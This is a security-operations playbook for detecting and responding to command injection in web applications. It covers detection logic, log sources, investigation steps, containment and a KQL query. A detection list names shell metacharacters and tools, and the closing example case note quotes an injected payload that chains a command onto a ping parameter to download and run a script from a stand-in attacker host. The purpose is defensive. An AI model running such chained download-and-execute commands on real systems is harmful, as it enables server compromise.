# Playbook: Command Injection

## Playbook ID & Name

**WEB-003 — Command Injection Detection and Response**

Category: Web Security. Applies to any application, admin console, or API endpoint where user-supplied input is passed — directly or after weak sanitization — into an operating-system shell or `exec`-family call on the server. Classic vectors: a "ping this host" / "traceroute" / "DNS lookup" diagnostic feature, a file-conversion or backup utility that shells out to `convert`/`tar`/`zip`, or a legacy PHP/Node/Python handler built with `system()`, `exec()`, `popen()`, `subprocess` with `shell=True`, or Java `Runtime.exec()` against a concatenated string instead of an argument array.

## Business Risk

**[STAKEHOLDER]** - This is one of the few web bugs that skips straight from "bad input validation" to "attacker has a shell on our server." Unlike SQL injection, which mostly threatens data in one database, command injection threatens the whole host — file system, other services on that box, and anything reachable from it on the internal network. A confirmed case on an internet-facing system is a same-day incident, not a backlog ticket, and it very often becomes the pivot point into the rest of the environment rather than staying contained to "the web app."

## Severity / Priority Default

**Critical** at trigger for any internet-facing system where a shell process is confirmed spawned by the web/app worker. **High** for injection attempts that were blocked pre-execution or occurred against an internal-only tool. Downgrade to **Medium/Low** only after the analyst confirms the payload never reached a shell context (safe `execve` with argument array, WAF block, or input rejected by app-layer validation before reaching the vulnerable function).

## MITRE ATT&CK Techniques

| ID | Technique | Where it fits |
|---|---|---|
| T1595 | Active Scanning | Automated fuzzing of parameters with shell metacharacters before a targeted payload lands |
| T1190 | Exploit Public-Facing Application | The injection itself — primary technique for this playbook |
| T1059.003 | Command and Scripting Interpreter: Windows Command Shell | Injected payload executes via `cmd.exe` on IIS/Windows-hosted apps |
| T1059.001 | Command and Scripting Interpreter: PowerShell | Injected payload calls `powershell.exe -enc` for a more capable follow-on stage |
| T1027 | Obfuscated Files or Information | Base64/hex-encoded or char-concatenated command strings used to slip past WAF pattern matching |
| T1105 | Ingress Tool Transfer | Injected command pulls a second-stage script/binary via `curl`, `wget`, or `certutil` |
| T1552.001 | Unsecured Credentials: Credentials In Files | Injected `cat /etc/passwd`, `type web.config`, or reads of `.env`/connection-string files |
| T1046 | Network Service Discovery | Post-shell recon commands (`nmap`, `nc -zv`, port sweep) launched from the compromised web host |
| T1071.004 | Application Layer Protocol: DNS | Blind/out-of-band confirmation — injected `nslookup`/`dig` against an attacker-controlled domain to prove execution when there's no visible response output |
| T1572 | Protocol Tunneling | Reverse shell or tunnel established over DNS/other protocol when direct inbound access isn't possible |

Not every case shows all of these — a lot of confirmed command injection never gets past step one (`whoami`/`id` for a proof-of-concept) before the WAF rule gets tightened and the attacker moves on. Don't force-fit the full chain if the evidence doesn't support it.

## Trigger / Detection Logic Summary

Alert fires when WAF, reverse proxy, or app logging flags a request parameter containing shell metacharacters (`;`, `|`, `&`, `&&`, `||`, backticks, `$()`, `>`, `<`, newline/`%0a`) or shell builtins/binaries (`wget`, `curl`, `nslookup`, `whoami`, `/bin/sh`, `powershell`) **and** either the request wasn't blocked, or the same source repeats variations against the same parameter (classic fuzzing-for-injectable-parameter behavior). The stronger, lower-noise trigger sits at the host layer: a web server worker process (`w3wp.exe`, `httpd`, `nginx`, `php-cgi.exe`, `java`) spawning a shell interpreter or command-line utility as a child process is almost never legitimate and should be a near-automatic high-confidence alert on its own, independent of what the web log shows.

**[ENGINEERING]** - Build this as two correlated rules joined on host + timestamp, not one: (1) a web-log/WAF rule matching metacharacter/command patterns in request parameters, and (2) a process-creation rule matching web-server-parent → shell-child. Rule (2) alone is usually higher-fidelity and lower-volume than rule (1); use rule (1) mainly to give the analyst the original payload for context once rule (2) fires.

## Required Log Sources & Event IDs

| Source | What to pull |
|---|---|
| WAF (AWS WAF / Cloudflare / Azure WAF / ModSecurity) | Rule match logs, action (block/log/count), matched pattern, transaction ID |
| Web/app server access + error log (IIS W3C, Apache/Nginx) | Full request URI, query string, method, status code, response size |
| Windows Security Event ID 4688 | Process creation with command line (requires command-line auditing enabled — verify this is actually turned on before assuming absence of an alert means absence of execution) |
| Sysmon Event ID 1 | Process creation — parent/child image path, command line, integrity level, hashes |
| Sysmon Event ID 3 | Network connection — outbound connections initiated by the web server process itself (reverse shell signature) |
| Sysmon Event ID 22 | DNS query — web host resolving attacker-controlled domains (OOB/blind command injection confirmation channel) |
| Linux auditd (`execve` records) | Command executed, calling process (`php-fpm`, `nginx worker`, `node`), UID, working directory |
| DNS resolver logs | High-entropy or unexpected subdomain lookups originating from the web/app tier |

## Key Fields to Inspect [ANALYST]

- **Raw request URI/body/headers** — decode URL, hex, and Unicode encoding before ruling a payload benign; attackers routinely wrap `;`, backticks, and `$()` in encoding specifically to survive naive pattern matching
- **Parent-child process relationship** — the single highest-value field in this whole playbook: web worker process spawning `cmd.exe`, `powershell.exe`, `/bin/sh`, `/bin/bash`, or a diagnostic binary (`nslookup`, `ping`, `curl`) it has no business calling directly
- **Process command line** (Sysmon 1 / 4688 / auditd) — the actual string handed to the shell; compare byte-for-byte against the decoded HTTP parameter to confirm the injection landed unmodified
- **Process integrity level / running account** — a web app service account spawning a shell in a medium/high-integrity context, or as `root`/`SYSTEM` instead of its normal low-privilege identity, is a hard escalation signal
- **Sysmon 22 QueryName** — random-looking or high-entropy subdomains against an unfamiliar domain, timed to the same second as the suspect request, is the fingerprint of blind command injection being confirmed out-of-band
- **Outbound connection destination** (Sysmon 3) — new destination IP/port from a host that normally only talks to its database and internal API dependencies

## Normal vs Suspicious Pattern

| Normal | Suspicious |
|---|---|
| Parameter matches expected type (hostname, IP, filename) with no shell metacharacters | Parameter contains `;`, `\|`, `&&`, backticks, `$()`, or encoded equivalents |
| Web worker process only ever spawns its own runtime helpers (PHP-FPM workers, JVM threads) | Web worker process (`w3wp.exe`, `httpd`, `php-cgi.exe`) spawns `cmd.exe`, `powershell.exe`, `sh`, or `bash` |
| Diagnostic feature (ping/traceroute/DNS lookup tool) runs the expected binary with one clean argument | Same feature's process command line includes a second command chained after the expected one |
| DNS from the web tier limited to app dependencies and OS update endpoints | Web host resolving an unfamiliar external domain immediately after a flagged request |
| Outbound connections from the host restricted to known internal services | New outbound connection to an external IP on an unusual port right after the suspect request |

## Investigation Steps

1. Pull the full raw request (headers + body) for the triggering event from WAF/proxy/app logs and decode any URL/hex/Unicode encoding to see the literal parameter value submitted.
2. Check WAF/proxy disposition — blocked, logged-only, or passed through to the origin. This alone determines whether you're chasing an attempt or a live compromise.
3. Pivot to host telemetry (Sysmon 1 / 4688 / auditd) for the same host and timestamp: did the web server worker process spawn a shell or unexpected binary as a child process?
4. If a child process exists, pull its full command line and compare it against the decoded HTTP parameter — confirm the injected string matches what actually executed.
5. Walk the process tree for grandchild processes — a confirmed shell often leads immediately to `whoami`/`id`/`uname` (proof-of-concept), a `curl`/`wget` tool download, or a file read of credential/config files.
6. Check Sysmon 22 (DNS) and Sysmon 3 (network) around the same window for callbacks to attacker-controlled infrastructure — required for confirming blind/out-of-band injection where the response body shows nothing.
7. Determine whether the vulnerable code path uses a shell at all — some frameworks pass metacharacters safely to `execve` with an argument array; if so, the payload may be inert regardless of how it looks in the log. Check with the app owner or review the relevant function if source access is available.
8. Scope the blast radius: single parameter probed once (likely scanner noise) vs. sustained multi-parameter attempts from the same source/ASN, or evidence the shell was actually used to touch other systems.

## True Positive Indicators

- Web server worker process confirmed spawning a shell interpreter or unexpected system binary as a direct child
- Decoded HTTP parameter matches the executed process command line
- Proof-of-concept commands (`whoami`, `id`, `hostname`, `uname -a`) or recon commands (`nmap`, `nc -zv`) observed in the process tree following the request
- DNS query to an attacker-controlled domain or new outbound connection immediately following the flagged request (OOB confirmation or reverse shell)
- Files consistent with a dropped second-stage tool appearing on disk shortly after the request

## False Positive / Benign Positive Indicators

- WAF/proxy blocked the request before it reached the vulnerable function — no corresponding process creation on the host
- The application passes arguments via a safe `execve`/argument-array call rather than a shell, so metacharacters in the string are inert regardless of pattern match
- Authorized vulnerability scan or pentest engagement running against the diagnostic feature — confirm against the scan/pentest calendar before escalating
- Legitimate input coincidentally containing a pipe, semicolon, or ampersand (e.g., a hostname field pasted from a config that included a comment character) with no corresponding shell process spawned
- Duplicate alerts from a load balancer health check retry hitting the same endpoint — correlate transaction IDs before counting as separate attempts

## Escalation Criteria

Escalate to Incident Response immediately if: a shell process is confirmed spawned on a production host (internet-facing or not); there's any outbound connection, DNS callback, or tool download following the injection; the compromised host has network reach into segments beyond its own tier (database, internal admin network); or credential/config files were read or exfiltrated. Command injection with confirmed execution should be treated as active compromise of the host, not a "web app finding" — pull in the endpoint/IR team even if the web-log evidence alone looks minor.

## Containment Options & Approval Authority

**[MANAGEMENT]**

| Action | Approval needed | Notes |
|---|---|---|
| WAF rule tune/block for the specific pattern or parameter | Tier 2 (standing authority) | Fastest, buys time while root cause is fixed |
| Block source IP/ASN at edge/CDN | Tier 2, notify app owner | Watch for shared-NAT/CDN false-positive risk |
| Disable the vulnerable feature/endpoint | App owner + on-call engineering lead | Often the fastest real fix if the feature isn't business-critical |
| Isolate the affected host from the network | IR lead + infrastructure owner (Sev-1 bridge) | Mandatory once a shell/process is confirmed and outbound activity observed |
| Rotate credentials/secrets accessible from that host | IR lead + system owner sign-off | Required if config/credential files were confirmed read |
| Full code remediation (parameterize, drop shell call for library call) | Engineering management, tracked as a change ticket | Root-cause fix — always follows containment, never replaces it |

## Example Query (Microsoft Sentinel / KQL)

```kql
DeviceProcessEvents
| where InitiatingProcessFileName in~ ("w3wp.exe","httpd","nginx","php-cgi.exe","java.exe")
| where FileName in~ ("cmd.exe","powershell.exe","sh","bash","nslookup.exe","curl.exe","wget.exe")
| project Timestamp, DeviceName, InitiatingProcessFileName, FileName,
          ProcessCommandLine, AccountName
| order by Timestamp desc
```

## Closure Criteria

Close as **True Positive** once the shell-spawn path is confirmed blocked (WAF rule, feature disabled, or code fix deployed), host telemetry shows no persistence or outbound compromise indicators beyond the initial proof-of-concept commands, and the affected credentials/secrets (if any were exposed) have been rotated. Close as **Benign Positive** when the flagged request never reached a shell context — safe `execve` call, blocked at the edge, or legitimate input with no corresponding process creation. Close as **Insufficient Evidence** when host-level process telemetry wasn't available for the relevant window (command-line auditing disabled, EDR agent offline, log retention expired) and execution status can't be confirmed either way — flag the logging gap to engineering rather than letting the case quietly lapse.

**Example case note:**
`2026-09-15 16:47 UTC — WAF logged (action=log, not blocked) a request to internal tool https://ops.northwindoutfitters.example/admin/diagnostics/ping?host=10.20.6.50 from src 203.0.113.91. Decoded parameter: "10.20.6.50; curl http://xk92.attacker-infra.example/x.sh -o /tmp/.x; chmod +x /tmp/.x; /tmp/.x". Host telemetry (auditd) on web-prod-07 confirms nginx worker (uid=www-data) spawned /bin/sh -> curl -> chmod -> /tmp/.x within the same second. Sysmon-equivalent DNS query to xk92.attacker-infra.example confirmed at 16:47:03. Escalated to IR as confirmed active compromise; host isolated from network at 16:52, /tmp/.x preserved for analysis, service account credentials on that host rotated. Root cause: diagnostics feature calls os.system() with unsanitized "host" parameter. Tracked as ENG-4821 to replace with subprocess argument-array call and input allowlist (valid IP/hostname regex only).`
